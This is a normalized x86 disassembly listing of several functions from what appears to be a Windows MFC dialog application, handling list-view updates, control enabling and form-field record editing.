mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x24 ] edi
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x218 ]
add esp 0x8
lea ebp [ esi + 0x218 ]
mov ecx ebp
push edi
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x2e0 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x1c4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x328 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x32c ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x330 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x334 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x338 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x33c ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x2e0 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_409bd0
push 0xffffffff
push sub_45d770
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x218 ]
lea edi [ esi + 0x218 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x32c ]
push ecx
lea ecx [ esi + 0x210 ]
call sub_442281
lea edx [ esi + 0x328 ]
lea ecx [ esi + 0x208 ]
push edx
call sub_442281
lea eax [ esi + 0x330 ]
lea ecx [ esi + 0x200 ]
push eax
call sub_442281
lea ecx [ esi + 0x334 ]
push ecx
lea ecx [ esi + 0x204 ]
call sub_442281
lea edx [ esi + 0x338 ]
lea ecx [ esi + 0x214 ]
push edx
call sub_442281
lea eax [ esi + 0x33c ]
lea ecx [ esi + 0x20c ]
push eax
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x1
lea ecx [ esi + 0x1c4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x188 ]
call sub_441841
mov eax [ esp + 0x24 ]
mov [ eax ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_409d70
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x210 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x200 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x214 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x1c4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_409e20
push 0xffffffff
push sub_45d788
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x210 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x208 ]
lea ebx [ esi + 0x208 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x200 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x204 ]
lea ebp [ esi + 0x204 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ esi + 0x218 ]
add esp 0xc
lea edi [ esi + 0x218 ]
push 0x0
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x2b4 ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x20 ]
lea eax [ esi + 0x210 ]
lea ecx [ esi + 0x32c ]
push eax
call sub_442281
push ebx
lea ecx [ esi + 0x328 ]
call sub_442281
lea eax [ esi + 0x200 ]
lea ecx [ esi + 0x330 ]
push eax
call sub_442281
push ebp
lea ecx [ esi + 0x334 ]
call sub_442281
lea ecx [ esi + 0x214 ]
push ecx
lea ecx [ esi + 0x338 ]
call sub_442281
lea edx [ esi + 0x20c ]
lea ecx [ esi + 0x33c ]
push edx
call sub_442281
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
mov ecx esi
call sub_409a20
push 0x0
push 0x0
push rw-data
call sub_4496b7
push rw-data
mov ecx ebx
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40a060
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45d7b0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x210 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x208 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x200 ]
lea ebx [ esi + 0x200 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x204 ]
lea ebp [ esi + 0x204 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x18 ]
push edi
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x2c ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x2c ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x218 ]
lea edi [ esi + 0x218 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
lea eax [ esi + 0x210 ]
lea ecx [ esi + 0x32c ]
push eax
call sub_442281
lea eax [ esi + 0x208 ]
lea ecx [ esi + 0x328 ]
push eax
call sub_442281
push ebx
lea ecx [ esi + 0x330 ]
call sub_442281
push ebp
lea ecx [ esi + 0x334 ]
call sub_442281
lea eax [ esi + 0x214 ]
lea ecx [ esi + 0x338 ]
push eax
call sub_442281
lea ecx [ esi + 0x20c ]
push ecx
lea ecx [ esi + 0x33c ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_409a20
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40a2d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45d7d0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0x78 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x218 ]
lea edi [ esi + 0x218 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_409a20
push rw-data
lea ecx [ esi + 0x210 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x200 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x214 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40a470
push 0xffffffff
push sub_45d83c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40a5d0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x124
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_40a690
push 0xffffffff
push sub_45d8d3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x82
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x18c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x190 ]
mov [ ebp ] eax
push 0x0
lea ecx [ esi + 0x194 ]
mov [ esp + 0x20 ] 0x8
call sub_40b290
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0x9
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40a7e0
push 0xffffffff
push sub_45d979
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x194 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xa
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x8
call sub_421723
lea ecx [ esi + 0x190 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f046
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40a8f0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ed
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3e8
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3ef
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3ee
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3ea
push edi
call sub_4493f1
lea eax [ esi + 0x18c ]
push eax
push 0x3ec
push edi
call sub_4493f1
add esi 0x190
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_40a9a0
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x190 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push 0x1
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_40aa20
push 0xffffffff
push sub_45d998
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x190 ]
lea ebp [ esi + 0x190 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x188 ]
lea ebx [ esi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ esi + 0x194 ]
add esp 0xc
lea edi [ esi + 0x194 ]
push 0x0
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x230 ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x20 ]
push ebp
lea ecx [ esi + 0x2a8 ]
call sub_442281
push ebx
lea ecx [ esi + 0x2a4 ]
call sub_442281
lea ecx [ esi + 0x18c ]
push ecx
lea ecx [ esi + 0x2ac ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40b110
push 0x0
push 0x0
push rw-data
call sub_4496b7
push rw-data
mov ecx ebx
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40abc0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45d9c0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x190 ]
lea ebx [ esi + 0x190 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x188 ]
lea ebp [ esi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x18 ]
push edi
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x2c ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x2c ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x194 ]
lea edi [ esi + 0x194 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
push ebx
lea ecx [ esi + 0x2a8 ]
call sub_442281
push ebp
lea ecx [ esi + 0x2a4 ]
call sub_442281
lea eax [ esi + 0x18c ]
lea ecx [ esi + 0x2ac ]
push eax
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40b110
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40ad90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45d9e0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0x78 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x194 ]
lea edi [ esi + 0x194 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40b110
push rw-data
lea ecx [ esi + 0x190 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40aed0
push 0xffffffff
push sub_45da00
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x194 ]
lea edi [ esi + 0x194 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x2a8 ]
push ecx
lea ecx [ esi + 0x190 ]
call sub_442281
lea edx [ esi + 0x2a4 ]
lea ecx [ esi + 0x188 ]
push edx
call sub_442281
lea eax [ esi + 0x2ac ]
lea ecx [ esi + 0x18c ]
push eax
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
mov eax [ esp + 0x24 ]
mov [ eax ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
